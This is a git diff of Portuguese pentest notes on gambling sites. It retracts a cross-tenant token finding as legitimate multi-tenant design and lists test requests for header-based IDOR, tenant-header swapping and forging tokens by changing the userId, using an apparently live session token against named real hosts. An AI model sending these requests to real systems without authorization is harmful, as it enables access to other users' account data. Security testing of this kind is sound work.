@@ -1,14 +1,9 @@
-# Possível CRÍTICO — token reutilizado entre domínios diferentes
+# Multi-tenant — comportamento legítimo (não é vulnerabilidade)
 
-## O que aconteceu
+## Esclarecimento
 
-Na sessão 2026-06-08, um único token gerado em `aphrodite777.com`:
-```
-Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
-```
-
-foi aceito sem erro em `hus3wyear.ccgamevip.com` (domínio diferente,
-infra diferente, possivelmente backend separado). Veja:
+Na sessão 2026-06-08, capturamos uma request automática que o próprio
+site `ds.aphrodite777.com` dispara após o registro:
 
 ```http
 GET /prod-api/year/api/yearRechargeReward HTTP/2
@@ -16,78 +11,98 @@ Host: hus3wyear.ccgamevip.com
 Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
 Nbcx: 207587
 Xutc: aphrodite777
-
-→ HTTP/2 200 OK
-{"code":200,"msg":"success","data":{"id":172929,"userId":207587,"day":20260609,"reward":100,...}}
 ```
 
-## Por que isso importa
+Essa request foi **disparada pela aplicação**, não pelo testador.
+Significa que:
 
-Numa arquitetura segura, cada tenant teria seu próprio segredo de HMAC.
-Tokens de `aphrodite777` seriam **inválidos** em `ccgamevip.com`.
-Aqui, o token foi aceito. Significa um destes três:
+- `hus3wyear.ccgamevip.com` é um **microserviço compartilhado** da
+  plataforma white-label (provavelmente o serviço de "year reward",
+  promoções anuais, calendário de eventos).
+- O tenant emissor é identificado pelo header `Xutc`.
+- O userId é redundantemente passado em `Nbcx` para roteamento.
 
-1. **Mesmo segredo HMAC** entre todos os tenants — então qualquer
-   user de qualquer tenant pode acessar APIs dos outros.
-2. **Sem validação real de hash** — o `:hash` no token é decorativo,
-   só o `userId` no início importa. Pior caso.
-3. **Validação delega ao header `Xutc`** — atacante coloca
-   `Xutc: aphrodite777` e ganha acesso. Trocando o `Xutc`, ganha em
-   outro tenant.
+**Isso é arquitetura legítima de multi-tenant.** Não é
+vulnerabilidade por si só.
 
-Qualquer uma das 3 hipóteses é vulnerabilidade séria.
+## O que ainda vale testar
 
-## Como confirmar
+A pergunta interessante NÃO é "será que o token funciona em outros
+domínios?" (resposta: por design, sim, é um microserviço compartilhado).
+A pergunta é "será que o microserviço valida CORRETAMENTE quem é o dono
+do token, ou aceita manipulação?".
 
-### Teste 1 — Token aphrodite em endpoint amizade
+### Teste 1 — `Nbcx` swap (forçar leitura de outro user)
 
 ```http
-GET /japi/user/balance/querySimpleBalance HTTP/2
-Host: ds.amizade777.com
+GET /prod-api/year/api/yearRechargeReward HTTP/2
+Host: hus3wyear.ccgamevip.com
 Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
+Nbcx: 137028                  ← TROCAR
+Xutc: aphrodite777
 ```
 
-Esperado: `code:401` ou `code:403`.
-Se vier `code:200`, é cross-tenant confirmado.
+| `Nbcx` | Status | data.userId no body | Notas |
+|--------|--------|----------------------|-------|
+| 207587 (original) | 200 | 207587 | baseline |
+| 137028 |        |                       |       |
+| 1      |        |                       |       |
+| 137027 |        |                       |       |
 
-### Teste 2 — Mesmo token, sem `Xutc`
+**Se `data.userId` mudar conforme `Nbcx`** = IDOR via header (severo).
+**Se sempre voltar 207587** = backend ignora `Nbcx` e usa o token (ok).
+
+### Teste 2 — `Nbcx` ausente
+
+```http
+GET /prod-api/year/api/yearRechargeReward HTTP/2
+Host: hus3wyear.ccgamevip.com
+Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
+Xutc: aphrodite777
+[remover Nbcx]
+```
+
+Resposta esperada se backend é robusto: 200 com `userId:207587` (extrai
+do token).
+Resposta se backend depende do `Nbcx`: 400 ou 401.
+
+### Teste 3 — `Xutc` swap (cross-tenant via microserviço)
 
 ```http
 GET /prod-api/year/api/yearRechargeReward HTTP/2
 Host: hus3wyear.ccgamevip.com
 Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
 Nbcx: 207587
-[REMOVE Xutc]
+Xutc: amizade777              ← TROCAR
 ```
 
-Se aceitar, o `Xutc` é decorativo.
+| `Xutc`          | Status | code | data |
+|-----------------|--------|------|------|
+| aphrodite777    | 200    | 200  | (referência) |
+| amizade777      |        |      |      |
+| lucky777        |        |      |      |
+| rainha777slots  |        |      |      |
+| megaslott       |        |      |      |
 
-### Teste 3 — Trocar Xutc para outro tenant
+**Se `Xutc:amizade777` retornar 200 com dados do user 207587 do tenant
+amizade777**, então o microserviço aceita roteamento entre tenants
+controlado pelo header — atacante registrado em `aphrodite777` lê dados
+de eventos de `amizade777`. Possível CRÍTICO se houver dados financeiros
+no response.
+
+### Teste 4 — Token forjado (userId trocado, hash mantido)
 
 ```http
 GET /prod-api/year/api/yearRechargeReward HTTP/2
 Host: hus3wyear.ccgamevip.com
-Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
-Nbcx: 207587
-Xutc: amizade777
-```
-
-Se vier 200 com dados de `amizade777`, então o `Xutc` controla qual
-backend responde — atacante pode varrer todos os tenants com 1 token.
-
-### Teste 4 — Forjar token cross-user
-
-Se o hash do token não validar tenant nem segredo, dá pra trocar só
-o userId no início:
-
-```
 Token: 137028:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
                                 ^^^ mantém o hash original
 Nbcx: 137028
+Xutc: aphrodite777
 ```
 
-Se o backend retornar dados do user 137028, é IDOR + token forjável.
-**Severidade crítica.**
+Se aceitar = hash do token não está sendo validado (CRÍTICO).
+Esperado: 401 ou 403.
 
 ## Cole os resultados aqui
 
